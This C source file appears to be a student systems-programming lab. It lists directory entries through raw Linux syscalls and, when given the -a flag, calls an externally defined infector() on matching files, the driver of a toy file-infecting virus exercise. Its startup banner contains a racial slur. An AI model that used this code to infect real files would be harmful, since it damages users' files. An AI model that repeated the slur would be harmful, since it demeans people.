#include "util.h"
extern int system_call();
extern void infection(int number);
extern void infector(char *file_name);


#define SYS_WRITE 4
#define SYS_READ 3
#define STDOUT 1
#define SYS_LSEEK 19
#define STDIN 0
#define STDERR 2
#define SYS_OPEN 5

int sysWrite(int output, char* sentance, int length, int debug){
	int retVal = 0;
	retVal = system_call(4, output, sentance, length);
	system_call(4, output, "\n",1);
	if (debug == 1){
		system_call(SYS_WRITE,STDERR,itoa(SYS_WRITE), strlen(itoa(SYS_WRITE)));
		system_call(SYS_WRITE,STDERR,":", 1);
		system_call(SYS_WRITE,STDERR,itoa(retVal), strlen(itoa(retVal)));
		system_call(SYS_WRITE,STDERR,"\n", 1);
	}
	return retVal;
}
int sysRead(int input, char* buff, int length, int debug){
	int retVal = system_call(3, input, buff, length);
	if (debug == 1){
		system_call(SYS_WRITE,STDERR,itoa(SYS_READ), 1);
		system_call(SYS_WRITE,STDERR,":", 1);
		system_call(SYS_WRITE,STDERR,itoa(retVal), 1);
		system_call(SYS_WRITE,STDERR,":", 1);
		system_call(SYS_WRITE,STDERR,buff, 1);
		system_call(SYS_WRITE,STDERR,"\n", 1);
	}
	return retVal;
}
int sysOpen(char* fileName, int mode, int mode2, int debug){
	int retVal = system_call(5, fileName, mode, mode2);
	if (debug == 1){
		system_call(SYS_WRITE,STDERR,itoa(SYS_OPEN), 1);
		system_call(SYS_WRITE,STDERR,":", 1);
		system_call(SYS_WRITE,STDERR,itoa(retVal), 1);
		system_call(SYS_WRITE,STDERR,"\n", 1);
	}
	return retVal;
}

typedef struct dirent {
       unsigned long  d_ino;     /* Inode number */
       unsigned long  d_off;     /* Offset to next linux_dirent */
       unsigned short d_reclen;  /* Length of this linux_dirent */
       char           d_name[];  /* Filename (null-terminated) */
                         /* length is actually (d_reclen - 2 -
                            offsetof(struct linux_dirent, d_name)) */
   } dirent;


void malawach(dirent *d, char* buf,int nread,int debug){
	if (debug){
  		char *type;

		char d_type = *(buf + nread + d->d_reclen - 1);

		if(d_type == 8)
			type = "regular";
		else if(d_type == 4)
			type = "directory";
		else
			type = "unknown";
		
	    
            system_call(SYS_WRITE,STDERR,type, strlen(type));
            system_call(SYS_WRITE,STDERR,": ", 1);
            system_call(SYS_WRITE,STDERR,itoa(d->d_reclen), 8);
            system_call(SYS_WRITE,STDERR,"\n", 1);
	}
}


int main (int argc , char* argv[], char* envp[])
{

  int prefix = 0;
  char *prefix_buff;
  int prefix_len;
  int afix = 0;
  char *afix_buff;
  int afix_len;
  int debug = 0;
  int i;
  int size = 0;
  char *typeNum;
  int tGood = 0;
  
  for (i = 1; i < argc; i++){
      
  	if (strncmp("-D", argv[i], 2) == 0)
		debug = 1;
	else if (strncmp("-p", argv[i], 2 ) == 0){
		prefix = 1; 
		prefix_buff = (argv[i] + 2);
        prefix_len = strlen(argv[i]) - 2;
    }
	else if (strncmp("-a", argv[i], 2) == 0){
        afix = 1;
		afix_buff = (argv[i] + 2);
        afix_len = strlen(argv[i]) - 2;
    } else if (strncmp("-t", argv[i], 2)==0){
        typeNum = (argv[i]+2);
        tGood = 1;
    }
  }
  sysWrite(1,"flame2 my nigga", 17, debug);
  int fd, nread;
  char buf[8192];
  dirent *d;
  
  fd = sysOpen(".", 0, 0, debug);
  if(fd < 0)
    return 0x55;
  
  int count = system_call(141, fd, buf, 8192);
  d = (dirent*) (buf);
  nread = 0;
  
  while (nread < count){
      
	d = (dirent*) (buf + nread);	
	size = d->d_reclen - 12;
        if(prefix){
                
                if(strncmp(d->d_name, prefix_buff, prefix_len) == 0){
                    sysWrite(1, "\n", 1, debug);
                    sysWrite(1, d->d_name, size, debug);
                    sysWrite(1, "\n", 1, debug);
                    malawach(d,buf,nread,debug);
                }
	     }
	     else if(afix){

		     if(strncmp(d->d_name, afix_buff, afix_len) == 0)	{
                    	sysWrite(1, "\n", 1, debug);
			 sysWrite(1, d->d_name, size, debug);
		         infector(d->d_name);
                    	 malawach(d,buf,nread,debug);
		     }
		} else if(tGood){
            char d_type = *(buf + nread + d->d_reclen - 1);
		     if(strncmp(typeNum, itoa(d_type), strlen(typeNum)) == 0)	{
                sysWrite(1, "\n", 1, debug);
                sysWrite(1, d->d_name, size, debug);
                sysWrite(1, "\n", 1, debug);
                malawach(d,buf,nread,debug);
		     }
		}
		
		else{
                    sysWrite(1, "\n", 1, debug);
		    sysWrite(1, d->d_name, size, debug);
                    malawach(d,buf,nread,debug);
		    
    }
    
	nread = nread + d->d_reclen;
  
      
}


  system_call(6, fd);	
  return 0;
}





